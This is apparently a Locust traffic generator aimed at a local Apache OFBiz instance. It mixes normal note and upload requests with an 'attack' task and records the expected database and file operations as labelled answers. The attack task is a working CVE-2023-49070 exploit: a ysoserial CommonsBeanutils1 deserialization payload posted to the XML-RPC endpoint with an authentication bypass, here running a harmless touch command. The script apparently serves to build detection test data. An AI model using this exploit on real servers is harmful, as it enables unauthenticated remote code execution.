from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright
import bs4
from urllib.parse import unquote
from gevent.lock import Semaphore
import subprocess


lock = Semaphore()  # 创建一个信号量，用于控制并发访问

data_dir = "/usr/src/apache-ofbiz/runtime/uploads/"

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
ysoserial_jar_path = os.path.join(os.path.dirname(__file__), "CVE-2023-49070", "ysoserial-all.jar")
answers = {}

users = [
    {
        "username": "admin",
        "password": "ofbiz",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}")  
                
                # 填写并提交登录表单  
                page.fill('input[name="USERNAME"]', username)  
                page.fill('input[name="PASSWORD"]', password)  
                page.click('input[type="submit"]') 
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                return cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"] = get_headers("http://localhost:8080/myportal/control/login", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    # print(str(response.request.body) if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        # print("name:", name)
                        if name == 'm1_files[]':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # 如果是表单提交，解析表单数据
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    if '?' in response.request_meta["name"]:
        query_string = response.request_meta["name"].split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # 对key和value进行URL解码
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    trans_id = None  # 初始化事务 ID
    user_index = 0  # 用户索引
        
    def on_start(self):
        try:
            # 登陆获取Session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([COOKIES, USER_AGENT]):
                for cookie in COOKIES:
                    self.client.cookies.set(cookie['name'], cookie['value'])
                self.client.headers["User-Agent"] = USER_AGENT
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:8080"
            self.client.headers["Origin"] = "http://localhost:8080"

            res = self.client.get("/myportal/control/main")
            externalLoginKey = re.search(r'externalLoginKey=([^"]+)"', res.text)
            if externalLoginKey:
                self.externalLoginKey = externalLoginKey.group(1)
            else:
                logger.error("Failed to obtain externalLoginKey.")
                raise Exception("Failed to obtain externalLoginKey.")

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    # @task
    def new_note(self, article_id=0):
        """创建新集合"""
        # 生成随机数据
        title = random_string(10)
        content = random_string(30)
        x_request_id = str(next(counter))
        with self.client.post(
            f"/myportal/control/createSystemInfoNote",
            headers={
                "x_request_id": x_request_id,
            },
            data={
                "noteParty": "admin",
                "moreInfoUrl": title,
                "noteInfo": content,
            },
            catch_response=True,
            allow_redirects=False,
            verify=False,  # 忽略SSL证书验证
        ) as response:
            # 处理响应
            entry = new_log_entry(response)
            if response.status_code == 200:
                # 解析响应
                response.success()
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "public.NOTE_DATA",
                        "columns": {
                            "NOTE_INFO": content,
                            "MORE_INFO_URL": title,
                        },
                        "is_match": True
                    },
                    {
                        "type": "INSERT",
                        "table": "public.SERVER_HIT",
                        "columns": {
                            "CONTENT_ID": "myportal.createSystemInfoNote",
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                # 响应写入html
                logger.error(f"Response content: {response.text}")
                logger.error(f"{'new' if article_id == 0 else 'update'} note failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    def get_all_note_ids(self):
        x_request_id = str(next(counter))
        with self.client.get(
            "/myportal/control/main",
            headers={
                "x_request_id": x_request_id,
            },
            catch_response=True,
            allow_redirects=False,
            verify=False,  # 忽略SSL证书验证
        ) as response:
            # 处理响应
            note_ids = []
            entry = new_log_entry(response)
            if response.status_code == 200:
                response.success()
                id_matches = re.findall(r'<input name="noteId" value="(\d+)"', response.text)
                if id_matches:
                    for id_match in id_matches:
                        note_ids.append(id_match)
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "public.SERVER_HIT",
                        "columns": {
                            "CONTENT_ID": "myportal.main",
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                logger.error(f"Get all note IDs failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            
            return note_ids
    
    # @task
    def delete_note(self):
        """删除集合"""
        # 获取所有集合 ID
        with lock:  # 确保线程安全
            note_ids = self.get_all_note_ids()
            if not note_ids:
                logger.warning("No notes found to delete.")
                return
            
            # 随机选择一个集合 ID
            note_id = random.choice(note_ids)
            x_request_id = str(next(counter))
            
            with self.client.post(
                f"/myportal/control/deleteSystemInfoNote",
                headers={
                    "x_request_id": x_request_id,
                },
                data={
                    "portalPageId": "MYPORTAL_EMPLOYEE",
                    "VIEW_SIZE_1": "20",
                    "noteId": note_id,
                    "VIEW_INDEX_1": "0",
                },
                catch_response=True,
                allow_redirects=False,
                verify=False,  # 忽略SSL证书验证
            ) as response:
                # 处理响应
                entry = new_log_entry(response)
                if response.status_code == 200:
                    response.success()
                    db_statements = [
                        {
                            "type": "DELETE",
                            "table": "public.CUST_REQUEST_ITEM_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.CUST_REQUEST_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.MARKETING_CAMPAIGN_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.ORDER_HEADER_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.PARTY_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.QUOTE_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.WORK_EFFORT_NOTE",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "public.NOTE_DATA",
                            "columns": {
                                "NOTE_ID": note_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "public.SERVER_HIT",
                            "columns": {
                                "CONTENT_ID": "myportal.deleteSystemInfoNote",
                            },
                            "is_match": True
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "db_statements": db_statements,
                        "request_time": time.time(),
                    }
                    logger.info(f"Deleted note with ID: {note_id}")
                else:
                    logger.error(f"Delete note failed with status code: {response.status_code}")
                    response.failure(f"Request failed with status code: {response.status_code}")

    def create_data_source(self, resource_id):
        """发送单独的表单请求（application/x-www-form-urlencoded）"""

        # x_request_id = str(next(counter))

        # 表单参数
        data = {
            "dataResourceId": resource_id,
            "dataResourceTypeId": "LOCAL_FILE",
            "dataTemplateTypeId": "",
            "dataCategoryId": "",
            "dataSourceId": "",
            "dataResourceName": "",
            "localeString": "",
            "mimeTypeId": "",
            "characterSetId": "",
            "objectInfo": "",
            "surveyId": "",
            "surveyResponseId": "",
            "relatedDetailId": "",
            "isPublic": "Y",
            "createdDate_i18n": "",
            "createdDate": "",
            "createdByUserLogin": "",
            "lastModifiedDate_i18n": "",
            "lastModifiedDate": "",
            "lastModifiedByUserLogin": ""
        }

        with self.client.post(
            "/content/control/createDataResource",
            # headers={
            #     "x_request_id": x_request_id,
            # },
            # params={
            #     "externalLoginKey": self.externalLoginKey,
            # },
            data=data,
            catch_response=True,
            allow_redirects=False,
        ) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"Failed with status {response.status_code}")

    # def get_data_resource(self, resource_id):
    #     """获取数据资源的详细信息"""
    #     x_request_id = str(next(counter))
    #     with self.client.get(
    #         f"/content/control/uploadImage?dataResourceId={resource_id}",
    #         headers={
    #             "x_request_id": x_request_id,
    #         },
    #         # params={
    #         #     "externalLoginKey": self.externalLoginKey,
    #         # },
    #         catch_response=True,
    #         allow_redirects=False,
    #     ) as response:
    #         if response.status_code == 200:
    #             # with open("result.html", "w") as f:
    #             #     f.write(response.text)
    #             response.success()
    #             return response

    # @task
    def upload_file(self):
        # 生成随机文件内容和文件名
        self.client.post(
            "/content/control/login",
            data={
                "USERNAME": "admin",
                "PASSWORD": "ofbiz",
                "JavaScriptEnabled": "N"
            }
        )

        res_id = random_string(10)
        self.create_data_source(res_id)
        # gevent.sleep(1.5)  # 等待数据源创建完成

        file_content = random_string(100)
        file_name = random_string(10) + ".txt"
        file_content = io.StringIO(file_content)


        x_request_id = str(next(counter))

        with self.client.post(
            "/content/control/uploadImage",
            headers={
                "x_request_id": x_request_id,
                "Referer": "http://localhost:8080/content/control/uploadImage"
            },
            data={
                "dataResourceId": res_id,
                "dataResourceTypeId": "LOCAL_FILE",
                "objectInfo": "",
                "submitButton": "Upload" 
            },
            files={
                "imageData": (file_name, file_content, "text/plain"),
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 200:
                response.success()
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}*/{res_id}.txt",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}*/{res_id}.txt",
                        "destination_path": None,
                        "is_directory": False
                    },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed with status {response.status_code}")

    @task
    def attack(self):
        x_request_id = str(next(counter))
        file_name = "attack_" + random_string(10)
        cmd = r"touch /usr/src/apache-ofbiz/runtime/uploads/" + file_name
        def gen_payload(cmd):
            gen_cmd = f'java -jar {ysoserial_jar_path} CommonsBeanutils1 "{cmd}" | base64 | tr -d "\\n"'
            result = subprocess.run(gen_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            payload = result.stdout.strip()
            xml_payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{payload}</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>"""
            return xml_payload
        xml_payload = gen_payload(cmd)
        with self.client.post(
            "/webtools/control/xmlrpc;/",
            headers={
                "x_request_id": x_request_id,
                "Content-Type": "application/xml",
            },
            params = {
                "USERNAME": "",
                "PASSWORD": "",
                "requirePasswordChange": "Y"
            },
            data=xml_payload.encode(),
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            logger.info(f"Attack response status code: {response.status_code}")
            entry = new_log_entry(response)
            if response.status_code == 200:
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
                response.success()
                logger.info(f"Attack successful")
            else:
                logger.error(f"Attack failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")
